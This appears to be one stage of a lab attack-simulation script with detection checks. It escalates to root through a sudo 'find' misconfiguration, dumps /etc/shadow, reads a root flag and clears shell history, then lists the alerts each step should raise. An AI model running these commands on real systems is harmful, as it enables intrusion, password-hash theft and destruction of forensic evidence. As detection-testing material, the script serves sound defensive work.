#!/usr/bin/env bash
# Stage 4 — root through the sudo find misconfiguration (GTFOBins), then
# credential access and a little anti-forensics.
set -euo pipefail
. "$(dirname "$0")/lib.sh"

check_target

say "www-data may sudo find — executing a root shell through -exec"
root 'id' | strip

say "dumping password hashes"
root 'cat /etc/shadow' | strip

say "reading the root flag"
root 'cat /root/flag.txt' | strip

say "covering tracks"
rce "bash -c 'history -c; unset HISTFILE'" | strip

note "expected on the target:"
note "  auth    INFO    every sudo COMMAND= line as it runs"
note "  process HIGH    cred-shadow-read — cat /etc/shadow"
note "  process CRITICAL flag-access — /root/flag.txt"
note "  process MEDIUM  antiforensics-history — history -c / unset HISTFILE"
